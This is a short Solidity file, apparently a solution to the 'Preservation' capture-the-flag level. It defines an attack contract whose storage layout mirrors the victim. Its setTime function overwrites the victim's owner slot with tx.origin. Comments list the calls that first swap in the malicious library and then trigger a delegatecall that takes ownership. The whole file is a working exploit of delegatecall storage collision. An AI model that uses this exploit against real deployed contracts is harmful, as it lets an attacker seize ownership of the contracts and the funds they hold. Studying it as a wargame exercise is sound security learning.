//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
import { Preservation } from "./Preservation.sol";

contract PreservationAttack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256 unimportantNumber) public {
        unimportantNumber ++; //just so we dont get "unused variable" warning lol

        owner = tx.origin;
    }
    // this in scripts file:

    // victim = Preservation(0xafE2ea21307aC37609284d27cF68Fc2FC5194318); //the contract of Preservation
    // victim.setFirstTime(uint160(0x3e451a46b4609dd4cc22989561c62448817d0907)); //our malicious contract
    // victim.setFirstTime(5); //it executes logic of our malicious contract and sets us to owner.
}